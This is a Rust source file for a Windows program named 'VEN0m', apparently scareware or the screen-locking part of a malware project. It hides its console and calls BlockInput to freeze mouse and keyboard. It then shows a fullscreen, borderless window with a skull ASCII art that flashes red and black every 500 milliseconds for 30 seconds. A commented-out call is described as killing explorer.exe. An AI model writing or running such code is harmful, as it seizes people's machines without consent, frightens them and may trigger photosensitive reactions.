#![windows_subsystem = "windows"]
use eframe::{egui, Frame, App, IconData};
use chrono::Local;
use image;
use std::thread::sleep;
use std::time::Duration;
mod core;

const ASCII_ART: &str = r#"

                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"
"#;



struct AppState {
    start_time: chrono::DateTime<chrono::Local>,
    last_flash: chrono::DateTime<chrono::Local>,
    black_bg: bool,
}

impl AppState {

    fn new() -> Self {
        let now = Local::now();
        Self {start_time: now, last_flash: now, black_bg: true}
    }

    // Close the gui after 30s
    fn should_close(&self) -> bool {(Local::now() - self.start_time).num_seconds() >= 30}
    // Invert the background and text color every 500ms
    fn should_flash(&self) -> bool {(Local::now() - self.last_flash).num_milliseconds() >= 500}

    fn colors(&self) -> (egui::Color32, egui::Color32) {
        if self.black_bg { (egui::Color32::BLACK, egui::Color32::RED) } 
        else { (egui::Color32::RED, egui::Color32::BLACK) }
    }
}

impl App for AppState {
    fn update(&mut self, ctx: &egui::Context, frame: &mut Frame) {
        if self.should_close() {
            frame.close();
            return;
        }

        if self.should_flash() {
            self.black_bg = !self.black_bg;
            self.last_flash = Local::now();
        }

        let (bg_color, text_color) = self.colors();

        egui::CentralPanel::default()
            .frame(egui::Frame { fill: bg_color, ..Default::default() })
            .show(ctx, |ui| {
                ui.vertical_centered(|ui| {
                    ui.add_space(20.0);
                    ui.label(egui::RichText::new(ASCII_ART).color(text_color).monospace().size(20.0));
                });
            });

        ctx.request_repaint();
    }
}

fn load_icon() -> IconData {

    let icon_bytes = include_bytes!(r"../assets/icon.ico");

    let image = image::load_from_memory(icon_bytes)
        .expect("[!] Failed to load icon")
        .to_rgba8();

    let (width, height) = image.dimensions();
    let rgba = image.into_raw();

    IconData {
        rgba,
        width,
        height,
    }
}

fn main() {

    loop {
        // Terminate explorer.exe and freese mouse and keyboard input
        //core::freeze();
        unsafe {winapi::um::winuser::BlockInput(1)};
        let options = eframe::NativeOptions {
            decorated: false,
            icon_data: Some(load_icon()),
            fullscreen: true,
            ..Default::default()
        };

        eframe::run_native("VEN0m", options, Box::new(|_cc| Box::new(AppState::new())));
        unsafe {winapi::um::winuser::BlockInput(0)};
        break;
    }
}
